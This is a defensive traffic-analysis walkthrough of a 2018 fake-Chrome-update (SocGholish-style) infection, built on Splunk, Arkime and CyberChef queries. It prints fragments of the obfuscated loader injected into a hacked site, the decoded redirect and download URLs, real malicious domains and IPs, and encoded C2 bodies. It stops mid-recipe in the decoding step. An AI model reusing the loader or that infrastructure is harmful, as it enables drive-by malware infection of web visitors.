---
title: Sorting through the alerts — hacked church site to a fake Chrome update, a WScript C2, a 349 KB payload and failed follow-on C2 (Splunk first, Arkime second)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - cyberchef
  - snort
  - socgholish
  - fake-update
  - c2
  - ticket
---

# Sorting through the alerts — fake Chrome update to WScript C2 and follow-on C2 attempts { #sorting-alerts }

!!! abstract "Case summary"
    malware-traffic-analysis.net **2018-06-30 "Sorting through the alerts"**, worked on the home-lab **pcapbox** VM with **Splunk (Zeek logs) as the main tool** and **Arkime only where Splunk cannot see** (page and POST contents). One Windows 7 PC (**CONSERVATOR-PC, user lloyd.maxwell**) opens a **hacked church website**. Script hidden in seven of the site's `.js` files sends the browser through a **redirector (TDS)** to a **fake "Update Chrome" page**, which downloads **`Chrome_72.3.22.js` from Dropbox**. 46 seconds later the user runs it: `wscript.exe` sends **three XOR-encoded POSTs** (host, user, domain, process list) to a C2 and gets back a **349 KB encrypted payload**, run as `Chrome_72.3.22.exe` from `%TEMP%`. The payload then tries two C2 servers by **bare IP** every ~7.5 minutes — **one refuses, one never answers**. Ends with one simple Snort rule and a short ticket.

| | |
|---|---|
| **Evidence** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31 min 51 s), 46,937 packets, SHA256 `902c9f31…ddb08e77` |
| **Source** | [malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts"](https://malware-traffic-analysis.net/2018/06/30/index.html) |
| **Given** | LAN 172.16.2.0/24, DC 172.16.2.9 (FabulousDuke-DC), domain fabulousdukes.com |
| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, field `pcap_case`), Arkime (tag = case name), Snort 2.9.20, CyberChef |
| **Deliverables** | Analysis, decoded redirect/download URLs and C2 bodies, one Snort rule, one incident ticket (txt) |
| **Related pages** | [Night Dew, second pass (pcapbox, Arkime + Splunk)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) · [Beaconing & C2](../../network/beaconing-c2.md) |

!!! tip "How to read this page"
    Every step has the same order: **Goal → Splunk → Arkime (only when Splunk cannot show it) → Result → Reading the result → Ticket entry**. Every SPL query is explained line by line. **Question** boxes answer the questions that come up on the way.

    Splunk sees Zeek's **summaries** (who, when, how big, which name). Zeek does not keep **page bodies or POST bodies**, so whenever the answer is *inside* the traffic, the step moves to Arkime for that one look and comes back.

    The result blocks were produced from the same PCAP. Connection counts in your Splunk may differ by one or two because of how Zeek splits retried connections — the findings do not change.

!!! warning "The indicators on this page are real"
    Domains, IPs and hashes come from real 2018 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep the values as typed. **Do not visit them.** Do not run anything you extract.

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Infected PC | **172.16.2.169, CONSERVATOR-PC**, MAC `00:13:d4:1f:a2:5e`, Windows 7 x64 | Confirmed |
| User | **lloyd.maxwell** (domain FABULOUSDUKES) | Confirmed |
| First malicious event | **20:27:53 UTC** — visit to the hacked site `www.stmarybahrain[.]com` (66.226.144.232) | Confirmed |
| Redirect chain | Injected script → `track.positiverefreshment[.]org/s_code.js` (185.244.149.74) → fake page `lw2e.sineadhollywoodnutt[.]com/topics/index.php` (93.95.100.178) | Confirmed |
| Download | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` at 20:28:01 (HTTPS — content not visible) | URL confirmed (decoded), download inferred from TLS |
| Execution | 20:28:47 — `wscript.exe` POSTs to `bb17eb22.login3.kimbrelelectric[.]com/blank.gif` (93.95.100.138) | Confirmed (body decoded) |
| Data sent | Script path, host name, user, domain, AV name, process list | Confirmed |
| Payload | 349 KB encrypted reply → `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe` | Confirmed (path reported by the script itself) |
| Follow-on C2 | 46.105.131.66:443 (refused) and 107.170.231.118:4143 (no answer), every ~7.5 min until the end | Confirmed — **no C2 session ever worked** |
| Malware family | Fake-update chain = **SocGholish (FakeUpdates)** style; follow-on behaviour **consistent with Dridex** | Not confirmed (no hash lookup or signatures) |
| Exfiltration / lateral movement | Only the reconnaissance POSTs; nothing to other internal hosts | Confirmed |

---

## Step 0 — Load the PCAP and check the clock { #prep }

**Goal:** give the PCAP a **case name** so its logs do not mix with earlier exercises, and make sure every tool shows **UTC**.

1. Rename the file to **`20180630_SORTING_ALERTS.pcap`** and drop it into `\\10.50.10.60\incoming`.
2. On pcapbox, wait for `DONE case=20180630_SORTING_ALERTS` in `tail -f /data/logs/ingest.log`. The `sha256=` on the `START` line is the evidence hash.
3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → General → Timezone = UTC**, time range **All**. (Why: see [Night Dew, second pass — 0-2](night-dew-arkime-splunk-netlogon-bruteforce.md#utc).)

Check the case is in Splunk:

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek sourcetype=zeek:conn` — Zeek's connection log (one row per connection).
- `stats count by pcap_case` — count rows per case name (`pcap_case` = the PCAP file name without `.pcap`).

```text
pcap_case                  count
20180511_NIGHT_DEW         216
20180630_SORTING_ALERTS    623
```

!!! note "`ts` or `_time`?"
    Zeek's own time is the field **`ts`** (seconds since 1970). pcapbox copies it into Splunk's `_time`, but every query here **sorts and prints with `ts`** — that works even on a Splunk where `_time` is the ingest time.

    `eval t=strftime(ts,"%H:%M:%S.%3N")` turns `1530390473.623` into `20:27:53.623` (`%3N` = milliseconds).

---

## Step 1 — The big picture { #overview }

**Goal:** capture window, how many internal PCs, and how busy each one is.

### Splunk { #overview-splunk }

**Query ① — capture window**

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
| stats min(ts) as first max(ts) as last count as sessions
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- Line 1: this case only.
- Line 2: one summary row — earliest and latest `ts`, number of connections.
- Line 3: epoch seconds → readable date.

```text
first                 last                  sessions
2018-06-30 20:27:15   2018-06-30 20:59:05   623
```

**Query ② — who starts connections**

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h
| sort - sessions
```

- `id_orig_h` = the IP that **started** the connection.
- `dc(id_resp_h)` = **distinct count** of destinations.
- `orig_bytes` / `resp_bytes` = payload bytes sent by the starter / by the other side.
- `sort - sessions` = biggest first.

```text
id_orig_h      sessions  destinations  sent      received
172.16.2.169   622       185           846554    34117200
172.16.2.9     1         1             62        0
```

### Arkime (quick cross-check) { #overview-arkime }

```text
tags == 20180630_SORTING_ALERTS
```

SPIView → **General** shows the same picture: Src IP almost all `172.16.2.169`; Dst IP led by the DC `172.16.2.9`, then many CDN/ad addresses.

### Reading the result { #overview-reading }

- **One PC.** 172.16.2.169 starts everything; 172.16.2.9 (the DC, as given) makes one NetBIOS reply. The alerts were about this PC.
- **185 destinations in 31 minutes** — far more than a beacon would need. That is a **person browsing** (news sites load dozens of ad and CDN hosts). The malicious traffic will be a few rows hidden among them, so counting "top talkers" will not find it. Read **HTTP** instead (Step 3).
- **34 MB received** — mostly web pages and (as Step 3 shows) a Chrome component update.

**Ticket entry:** none. Baselining is not a finding.

---

## Step 2 — Who is 172.16.2.169? { #identity }

**Goal:** host name, MAC and user for the ticket.

### 2-1. DHCP — empty this time { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20180630_SORTING_ALERTS
| table ts client_addr mac host_name
```

**Result: no rows.**

!!! question "Question: DHCP gave nothing — what now?"
    The PC already had a valid lease when the capture started, so it never asked. Use the other places Windows says its name:

    - **Kerberos** — the computer account (`NAME$`) and the user at logon.
    - **DNS** — Windows registers its own name with the DC (a `SOA` query for `<name>.<domain>` = dynamic DNS update).
    - **NetBIOS browser announcements** (UDP 138 to the broadcast) — Zeek does not log these, Arkime shows them.
    - **MAC** — Zeek's `conn.log` has `orig_l2_addr` only if that option is on; Arkime always shows the MAC in the session.

### 2-2. Kerberos { #kerberos }

```spl
index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| sort ts
| table t id_orig_h request_type client service success error_msg
```

- `request_type`: **AS** = logon (ask for a TGT), **TGS** = ticket for a service.
- `client` = `account/REALM`. A name ending in **`$`** is a **computer**; without `$` it is a **person**.
- `service` = what the ticket is for (`krbtgt/...` = the logon ticket itself, `cifs/` = file sharing, `ldap/` = directory).
- `error_msg` = why a request failed.

```text
t         id_orig_h     request_type  client                              service                                   success  error_msg
20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  false    KDC_ERR_PREAUTH_REQUIRED
20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  true     -
20:27:17  172.16.2.169  TGS           CONSERVATOR-PC$/FABULOUSDUKES.COM   ldap/FabulousDuke-DC.fabulousdukes.com/…  true     -
...
20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      false    KDC_ERR_PREAUTH_REQUIRED
20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      true     -
20:27:18  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     host/conservator-pc.fabulousdukes.com     true     -
20:27:35  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     LDAP/FabulousDuke-DC.fabulousdukes.com/…  true     -
20:27:36  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     cifs/fabulousduke-dc.fabulousdukes.com    true     -
...
```

- The first AS of each account fails with **`KDC_ERR_PREAUTH_REQUIRED`** and the next one works — normal **pre-authentication**, not a wrong password.
- Upper/lower case of the names can differ between rows (`conservator-pc$` / `CONSERVATOR-PC$`) — Windows is not consistent; it is the same account.
- The PC logs on at 20:27:17 and **lloyd.maxwell** at 20:27:18 — the capture starts right at logon.

### 2-3. DNS dynamic update { #dns-name }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS qtype_name=SOA
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h query qtype_name rcode_name
```

- `qtype_name=SOA` — only "who owns this zone?" queries, which Windows sends before updating its own DNS record.

```text
t         id_orig_h      id_resp_h    query                               qtype_name  rcode_name
20:27:16  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
20:27:16  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
20:37:03  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
20:37:03  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
```

### 2-4. Arkime: MAC and NetBIOS name { #arkime-mac }

```text
tags == 20180630_SORTING_ALERTS && ip.src == 172.16.2.169 && port.dst == 138
```

Expand a session: **Src MAC `00:13:d4:1f:a2:5e`**, and the payload shows `\MAILSLOT\BROWSE ... CONSERVATOR-PC` (the PC announcing itself to the network).

**Reading:** IP 172.16.2.169, host **CONSERVATOR-PC** (Kerberos, DNS and NetBIOS agree), MAC `00:13:d4:1f:a2:5e`, user **lloyd.maxwell**, domain FABULOUSDUKES / fabulousdukes.com, DC 172.16.2.9.

**Ticket entry (host details only):**

```text
172.16.2.169 CONSERVATOR-PC (MAC 00:13:d4:1f:a2:5e) – user FABULOUSDUKES\lloyd.maxwell
```

---

## Step 3 — HTTP first: from a church website to a fake Chrome update { #http }

### 3-1. HTTP by host { #http-hosts }

**Goal:** 134 HTTP requests is too many to read one by one at first. Group them by **Host** and look at the shape.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host
| sort first
```

- `host` — the HTTP Host header (pcapbox puts it into Splunk's `host` field).
- `values(method)` / `values(user_agent)` — every distinct value per host.
- `sort first` — in the order the hosts were first used.

```text
host                                   count  first     methods     user_agents
www.stmarybahrain.com                  52     20:27:53  GET         Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
track.positiverefreshment.org          3      20:27:55  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
lw2e.sineadhollywoodnutt.com           9      20:27:57  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
ocsp.digicert.com                      1      20:28:00  GET         Microsoft-CryptoAPI/6.1
bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
redirector.gvt1.com                    32     20:33:54  HEAD GET    Microsoft BITS/7.5
r4---sn-p5qs7nek.gvt1.com              15     20:33:54  HEAD GET    Microsoft BITS/7.5
r4---sn-p5qs7nee.gvt1.com ... (6 more gvt1.com hosts)  20:34–20:35  GET    Microsoft BITS/7.5
crl.microsoft.com                      2      20:43:13  GET         Microsoft-CryptoAPI/6.1
```

**Reading — rule things out first:**

- **`*.gvt1.com` with `Microsoft BITS/7.5`** — Google's download servers. The URIs are `/edgedl/release2/chrome_component/.../PepperFlashPlayer.crx3`: Chrome updating its **Flash component** through Windows BITS. Normal, and the reason for most of the 34 MB.
- **`ocsp.digicert.com`, `crl.microsoft.com`** — certificate checks by Windows (`Microsoft-CryptoAPI`). Normal.

**What is left, in time order, all within one minute:**

1. `www.stmarybahrain[.]com` — a church website, 52 requests (a whole page with images and scripts).
2. `track.positiverefreshment[.]org` — 2 s later. A "tracking" name on an unrelated domain.
3. `lw2e.sineadhollywoodnutt[.]com` — 2 s later. A random-looking sub-domain.
4. `bb17eb22.login3.kimbrelelectric[.]com` — 50 s later, **POST only**, and a **different User-Agent**.

The browser (Chrome 67) made 1–3. Something else made 4. Step 3 explains 1–3; Step 4 explains 4.

!!! question "Question: the PC also loaded cnn.com and dozens of ad servers — are those part of it?"
    Look at DNS: `www.cnn.com` was asked at 20:27:52.99, **one second before** the church site, and the ad/CDN names follow from that page. That is the user (or a start-up tab) opening CNN — all HTTPS, all well-known services. They are noise. The test is the **Referer** (next step): none of the ad requests point back to the church site, but every suspicious request does.

### 3-2. Who sent the browser where — the Referer chain { #referer }

**Goal:** prove that 2 and 3 came **from** the church site, not from another tab.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
| eval t=strftime(ts,"%H:%M:%S.%3N")
| dedup host uri
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
| search NOT uri="*.jpg" NOT uri="*.gif" NOT uri="*.png" NOT uri="*.css"
```

- Line 1: `host IN (...)` — only the three hosts.
- `dedup host uri` — one row per page (drop repeats).
- `referrer` — Zeek's name for the **Referer** header: the page that asked for this one.
- Last line: hide images and style sheets so the scripts and pages stand out. `NOT` = exclude.

```text
t              host                            uri                                                     referrer                                    status  mime                    len
20:27:53.623   www.stmarybahrain.com           /                                                       -                                           200     text/html               ...
20:27:53.765   www.stmarybahrain.com           /new                                                    http://www.stmarybahrain.com/               301     text/html               ...
20:27:53.892   www.stmarybahrain.com           /new/                                                   http://www.stmarybahrain.com/               200     text/html               31295
20:27:54.637   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/ext-core.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
20:27:54.749   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/menu.min.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
...
20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba              http://www.stmarybahrain.com/new/           200     text/plain              2761
20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1f7de3bc9b07d&rand=...&key=...&0=0&1=&2=16   http://www.stmarybahrain.com/new/   200   text/plain   4911
20:27:56.467   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213d05805d3ca4d&rand=...&0=Mozilla&1=Netscape&2=5.0 (Windows...   http://www.stmarybahrain.com/new/   200   text/plain   2329
20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   text/plain   4399
20:27:57.302   lw2e.sineadhollywoodnutt.com    /chromefiles/css.css                                    http://www.stmarybahrain.com/new/           200     text/plain              8304
```

**Reading:**

- Every request to the two strange hosts has **Referer `http://www.stmarybahrain.com/new/`**. The church page itself loaded them — the site is **compromised**.
- The first `GET /` has **no Referer**: the user typed the address or used a bookmark. No phishing email or search result in front of it.
- `s_code.js` is asked **three times**, and each URL is longer than the last. The third carries the browser name, the full User-Agent, the language and many numbers (`&0=Mozilla&1=Netscape&2=5.0 (Windows...`). That is a **browser fingerprint**: a redirector (**TDS**, traffic distribution system) deciding whether this visitor is worth infecting — Windows yes, Android no, security researcher no.
- `cid=220` (TDS) and `b=220` (fake page) carry the **same number** — same campaign.
- The fake page path is `/topics/index.php`, and its files are in **`/chromefiles/`** (`chrome.min.css`, `chrome_logo_2x.png`, `chrome-new.jpg`). A page dressed up as Chrome, on a domain that is not Google.
- `resp_mime_types` is Zeek's guess **from the content**. JavaScript is shown as `text/plain` — normal, Zeek has no special JS type.

### 3-3. What the hacked site injected (Arkime) { #injected }

Splunk shows *that* the site loaded the TDS; it cannot show *how*, because the code is in the response bodies. One look in Arkime:

```text
tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *menu.min.js*
```

- `host.http` — the HTTP Host. `http.uri == *menu.min.js*` — URI contains `menu.min.js` (`*` = anything).

Expand the session → scroll to the end of the **response**. After the real menu code there is an extra block:

```text
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];
if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){
var w=document.createElement('script');w.type='text/javascript';w.async=true;
w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');
...
```

The strings are hidden with a simple trick in the function `b()`: **keep every second character, then reverse the string**. CyberChef does the same in two steps:

1. Paste the quoted text (without the quotes) into **Input**.
2. **Find / Replace** — Find `(.)(.)` (type **Regex**), Replace `$2`, **Global match** on. This keeps the second character of every pair.
3. **Reverse** (By Character).

| Hidden string | Decoded |
|---|---|
| `st{n(e4g9A2r,exs,u8` | `userAgent` |
| `je,i{kaofo6c(` | `cookie` |
| `hs{w{o{d;n,i5W)` | `Windows` |
| `rd4i{ojr}d;n)A}` | `Android` |
| `:=ea)m,t3u{_,_4_5` | `___utma=` |
| `5a{b)28e;...p)tnt}h8` | `http://track.positiverefreshment.org/s_code.js?cid=220&v=24eca7c911f5e102e2ba` |

So the injected code says: **"if the browser is on Windows and not Android, and has no `___utma=` cookie yet (has not been here before), load the TDS script."** The cookie check makes the attack show only **once** per victim — a reason it is hard to reproduce.

!!! note "If the string length is odd"
    `(.)(.)` leaves the last single character untouched, and after **Reverse** it becomes the **first** character of the output (`y` in `yhttp://...`). Ignore it — `b()` drops it too.

!!! question "Question: is it only in menu.min.js?"
    Check the other scripts the same way, or search all site bodies at once in Arkime:

    ```text
    tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *.js*
    ```

    Open each. The same block is appended to **seven** files: `menu.min.js`, `ext-core.js`, `mootools.js`, `caption.js`, `jquery.js`, `s3Slider.js`, `md_stylechanger.js`. The attacker changed the site's own files — the site owner must clean all of them, which goes into the ticket as "compromised site".

### 3-4. The TDS reply and the fake page (Arkime + CyberChef) { #tds }

**Goal:** find how the browser got from `s_code.js` to the fake page, and what the fake page tells the browser to download.

**TDS reply.** In Arkime:

```text
tags == 20180630_SORTING_ALERTS && host.http == track.positiverefreshment.org
```

Expand the session. Three request/reply pairs. The **third reply** (2,329 bytes) ends with:

```text
var s=document.createElement('script');s.type='text/javascript';s.async=true;
s.src=getUrl('o0(4(2;0v4;7mch2,1)741)937gf)8}6,5d3{d{4y0)c)dy1{7y0{9)0;24a;888)=za;&s0(2(2;=ib}&;891(1}577{79=lsj?}p{h8p}.)x}e3d{n}i{/}sic}i}p{oqt5/,m3o;c{.(t6t(u{n)d)ono9w9y;l(l}o{h{d}a,e}n,i5s,.7ey26w(l)/,/):,p;t;t0hy');
```

Same trick, function renamed to `getUrl`. Same CyberChef recipe:

```text
http://lw2e.sineadhollywoodnutt.com/topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240
```

This is exactly the next URL in the Splunk list (20:27:57.029). **The TDS passed the fingerprint check and handed out the fake page.**

**Fake page.** In Arkime:

```text
tags == 20180630_SORTING_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
```

The reply is not an HTML page but a **script that rewrites the church page in place** (`document.head.innerHTML = ...`, `document.body.innerHTML = ...`). Read the visible text in it:

```text
<title>Update Chrome</title>
<h1 id="main-title">You are using an older version of Chrome</h1>
Update now to keep your Chrome browser running smoothly and securely.
Your download will begin automatically. If not, click here:
<a ... id="buttonDownload">Update Chrome</a>
```

And at the end:

```text
var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
setTimeout(function() { window.location.href = fileUrl; }, 3000);
document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };
```

CyberChef again:

```text
https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1
```

**Reading:**

- The user sees the church site turn into a **Chrome update page**. After **3 seconds** (`setTimeout ... 3000`) the browser opens the download link by itself; the button does the same.
- The file is **`Chrome_72.3.22.js`** — a **JavaScript file**, not an installer. On Windows a double-clicked `.js` runs in **Windows Script Host (`wscript.exe`)** with the user's rights — outside the browser.
- It is hosted on **Dropbox** (`dl=1` = download, not preview). A trusted domain over HTTPS: proxies and filters let it through, and the file content cannot be seen in the PCAP.
- Chrome **67** was the real current version in June 2018; "72.3.22" did not exist — a small clue for users.

!!! question "Question: why is this called SocGholish / FakeUpdates?"
    That is the name researchers use for this campaign: **hacked legitimate sites → fingerprinting TDS → fake browser-update page → a JavaScript file → a WScript C2 that profiles the PC and then delivers a second malware**. Every part seen so far matches that pattern. It is still a **pattern match** — without a hash lookup or a vendor signature, the ticket says "SocGholish-style".

### 3-5. Did the download happen? (Splunk) { #download }

**Goal:** the download is HTTPS, so there is no URL or file in `http.log`. Look for the **server name** in DNS and TLS instead.

```spl
index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_ALERTS server_name="*dropbox*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h id_resp_p server_name version established
```

- `zeek:ssl` — one row per TLS session. `server_name` is the **SNI**: the name the client asks for in plain text before encryption starts.
- `established` — whether the TLS handshake finished.

```text
t              id_resp_h     id_resp_p  server_name                                              version  established
20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
20:28:01.640   162.125.9.6   443        uc7cfbc6f640f168ed8036c6d5bb.dl.dropboxusercontent.com   TLSv12   true
```

How much came back from the download server:

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h=162.125.9.6
| eval t=strftime(ts,"%H:%M:%S")
| table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state
```

```text
t         id_resp_h    id_resp_p  duration  orig_bytes  resp_bytes  conn_state
20:28:01  162.125.9.6  443        ...       1237        23469       SF
```

**Reading:**

- 20:27:57 fake page + 3 s timer → **20:28:00 www.dropbox.com** → **20:28:01 `*.dl.dropboxusercontent.com`** (Dropbox's file server — the `dl=1` link redirects there). The timing fits the script exactly.
- **~23 KB** came back including TLS overhead — small, as a `.js` file is. The content and its hash are **not visible**; the host operator must collect `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` (Step 4 confirms this path).

**Ticket entry:**

```text
[0020 261124, Sung] – Investigating HTTP referer chain from www.stmarybahrain.com to fake Chrome update page – Found – Further Analysis Required
[0034 261124, Sung] – Looking for download of the fake update file by 172.16.2.169 – Found – Further Analysis Required
```

---

## Step 4 — The script runs: a WScript C2 { #wscript }

### 4-1. A new User-Agent appears { #ua }

**Goal:** a downloaded file is not an infection until it **runs**. A script engine does not send Chrome's User-Agent — look for a new one.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(host) as hosts by user_agent
| sort first
```

- One row per User-Agent: how many requests, first time, which hosts.

```text
user_agent                                                                                  count  first     hosts
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ... Chrome/67.0.3396.99 ...     64     20:27:53  lw2e.sineadhollywoodnutt.com track.positiverefreshment.org www.stmarybahrain.com
Microsoft-CryptoAPI/6.1                                                                     3      20:28:00  crl.microsoft.com ocsp.digicert.com
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR ...)   3      20:28:47  bb17eb22.login3.kimbrelelectric.com
Microsoft BITS/7.5                                                                          64     20:33:54  redirector.gvt1.com r2---sn-... r4---sn-...
```

**Reading:** `MSIE 7.0` on Windows 7 with `Trident/7.0` (IE11's engine) is the **default User-Agent of the Windows scripting HTTP objects** (`MSXML2.XMLHTTP`/`WinHttp` called from `wscript.exe`). It appears **46 seconds after the Dropbox download** and is used for exactly one host. → The user opened `Chrome_72.3.22.js`.

### 4-2. The three POSTs { #posts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
```

- `request_body_len` — bytes the PC **sent** in the POST body. `response_body_len` — bytes the server sent back.

```text
t              id_orig_p  id_resp_h      id_resp_p  method  uri         status  request_body_len  response_body_len  resp_mime_types
20:28:47.389   49440      93.95.100.138  80         POST    /blank.gif  200     72                11866              text/plain
20:28:48.186   49440      93.95.100.138  80         POST    /blank.gif  200     2644              348868             text/plain
20:28:50.047   49440      93.95.100.138  80         POST    /blank.gif  200     256               0                  -
```

The DNS lookup just before:

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS query="*kimbrelelectric.com"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t query answers
```

```text
t              query                                  answers
20:28:46.647   bb17eb22.login3.kimbrelelectric.com    93.95.100.138
```

**Reading:**

- **POST to `/blank.gif`.** A GIF is something you *download*; you do not POST data to an image. The name is camouflage.
- Three POSTs on **one connection** (same source port 49440) in **three seconds**: small (72 B) → big (2,644 B) → small (256 B). Replies: 11.9 KB → **349 KB** → nothing. A script talking to its server, not a person.
- **349 KB back** — much bigger than any command. Something was **delivered** (4-4).
- `93.95.100.138` and the fake page's `93.95.100.178` are in the **same /24 network** — the same operator.
- The sub-domain `bb17eb22.login3.` looks generated (8 hex characters) — a fresh name per victim or campaign.

### 4-3. Reading the POST bodies (Arkime → CyberChef) { #decode-posts }

Zeek logs only the sizes. The bodies are in Arkime:

```text
tags == 20180630_SORTING_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
```

Expand the session. The request headers:

```text
POST /blank.gif HTTP/1.1
Accept: */*
Accept-Language: en-us
Age: 464b8967d47e14d7
Content-Type: application/x-www-form-urlencoded
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
Host: bb17eb22.login3.kimbrelelectric.com
```

- **`Age:` in a request is wrong.** `Age` is a header that *caches send in replies*. Here it carries a 16-hex-character value, the same in all three POSTs — most likely a **victim/session ID**.
- `UA-CPU: AMD64` — added by Windows' HTTP objects on 64-bit systems. Another sign of a script, not a browser.

The three bodies:

```text
a=075d6d603e653c386b3969687b6c60686d6a7b6f606c686e6d6e646d686f6b646e6a7b
b=8cdbebe6eeebecfdeae698fee89afeee988ea8bea9a8feee98b7b7b4a2bff5b6baa3acbeb7b7feee98...   (2,642 hex characters)
c=d6c8f8f5fdf8ffeef9f58bedfb89edfd8b9dbbadbabbedfd8b848487918cb6f9e6858990edfd8b89b8...
```

**How to recognise and break it:**

1. After `a=`, `b=`, `c=` only **`0–9 a–f`** appear → **hex** text. Hex → bytes gives garbage → **another layer**.
2. Try **single-byte XOR** (only 256 keys). Pick the right key with a **crib** — text you expect inside. This is a form post (`Content-Type: application/x-www-form-urlencoded`), so the plain text should look like `name=value&name=value`. Use the crib **`&1=`**.

**CyberChef recipe** (do each body separately; copy only the hex **after** `b=`):

1. **From Hex**.
2. **XOR Brute Force** — Key length `1`, Crib `&1=`. Note the key on the row that shows readable text.
